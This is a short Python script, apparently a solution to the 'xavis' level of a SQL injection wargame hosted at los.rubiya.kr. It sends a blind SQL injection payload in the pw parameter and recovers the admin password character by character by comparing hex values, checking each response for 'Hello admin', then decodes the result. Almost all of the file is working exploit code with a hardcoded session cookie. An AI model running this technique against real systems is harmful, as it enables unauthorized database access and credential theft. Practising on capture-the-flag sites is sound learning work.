import requests
import string
import codecs

session = requests.Session()

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or (ord(substr(hex(pw),{},1))={});%23"
cookies = {"PHPSESSID": "97ghjrfm38d8a8k1o1edj31qv3"}
pw=''
for i in range(1,19):
    for j in "0123456789ABCDEF":
        print(i,url.format(i,ord(j)))
        r = requests.get(url.format(i,ord(j)), cookies=cookies)
        if('Hello admin' in r.text[:200]):
            pw += j
            print("Password :", pw)
            break
print("Password :", pw)
x=codecs.decode(pw, "hex").decode('utf-8')
print(x)
